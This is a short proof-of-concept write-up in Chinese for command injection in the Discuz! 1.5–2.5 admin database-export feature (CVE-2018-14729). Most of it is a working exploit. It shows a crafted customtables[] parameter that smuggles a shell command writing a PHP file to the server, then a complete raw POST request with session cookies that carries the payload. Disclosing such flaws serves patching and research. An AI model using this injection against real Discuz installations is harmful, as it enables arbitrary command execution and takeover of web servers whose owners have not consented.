## Affected Version  

 **Discuz! 1.5-2.5**

## POC

需要登入后台。

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/new/Snip20181220_14.png)
![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/new/Snip20181220_15.png)

修改的参数

参数`customtables[]`

    customtables%5B%5D=pre_common_admincp_cmenu">aaa; echo '<?php phpinfo(); ?>' > phpinfo.php #

数据包

    POST /discuz25/admin.php?action=db&operation=export&setup=1 HTTP/1.1
    Host: localhost
    Content-Length: 252
    Cache-Control: max-age=0
    Origin: http://localhost
    Upgrade-Insecure-Requests: 1
    Content-Type: application/x-www-form-urlencoded
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
    Referer: http://localhost/discuz25/admin.php?action=db&operation=export
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: _ga=GA1.1.994534325.1530166127; PHPSESSID=ffe1069f199ac7656303b61e42db4f5d; ECSCP_ID=e685eee56d5dc4a732b0b1ecb8cbac6becac2355; ECS_ID=b9e7920dfb02c84b5298d0022c64a8fc393376d7; Phpstorm-326452dc=558db1bc-7f7b-4670-8d36-9cef7d8c1b9d; ECS[visit_times]=8; 3Od_visitedfid=2; 3Od_auth=03d3WSoYgxBuC4Yg3mqq4yEVgLBDsrbNx%2F8rIcURpRI5sDFtpC1S9F%2BYa6BViyFggZYM7bac7evIAZJdgLOJ7Q; 3Od_sid=mm4AMQ; QoOR_2132_saltkey=V6AnRzmw; QoOR_2132_lastvisit=1545183584; QoOR_2132_widthauto=-1; R94S_2132_saltkey=1hs56u42; R94S_2132_lastvisit=1545220172; R94S_2132_promotion=1; R94S_2132_auth=75696lGYV1FEogy00DO%2FmyhWbxk8OljAPZAeSvxfgwvvLbMruyS2sfVSYZUG4wr3GYw5L66%2FfppgB9gzioss; R94S_2132_creditnotice=0D0D2D0D0D0D0D0D0D1; R94S_2132_creditbase=0D0D1D0D0D0D0D0D0; R94S_2132_creditrule=%E6%AF%8F%E5%A4%A9%E7%99%BB%E5%BD%95; R94S_2132_ulastactivity=e0adnKO8pY2qUt5XPBdVc3jbgQxCrCiAkAFzNuN%2Fu9wTbgHc7XLK; R94S_2132_sid=9H4E8j; R94S_2132_lastact=1545224711%09admin.php%09; QoOR_2132_sid=BdGwL9; QoOR_2132_sendmail=1; QoOR_2132_ulastactivity=9cf4%2B3XCcfF1uHee0LOFG0wa6FFvCc1Rp96Kg%2BkgOi%2FL7ovDRKru; QoOR_2132_auth=32d7SwpKowF2VAeqfqe0dWo1FjINHjZA9zt%2ByF8A7LOif0pFSaHnEznijiCaqgsQD8NSBtEiwEDL4Wrnx1gz; QoOR_2132_checkpatch=1; QoOR_2132_checkupgrade=1; QoOR_2132_lastact=1545224853%09admin.php%09
    Connection: close
    
    formhash=0d2eaac0&scrolltop=&anchor=&type=custom&customtables%5B%5D=pre_common_admincp_cmenu">aaa; echo '<?php phpinfo(); ?>' > phpinfo.php #&method=shell&extendins=0&sqlcompat=&usehex=1&usezip=0&filename=181219_u0CC19kJ&exportsubmit=%E6%8F%90%E4%BA%A4




## References
https://paper.seebug.org/763/
https://github.com/FoolMitAh/CVE-2018-14729




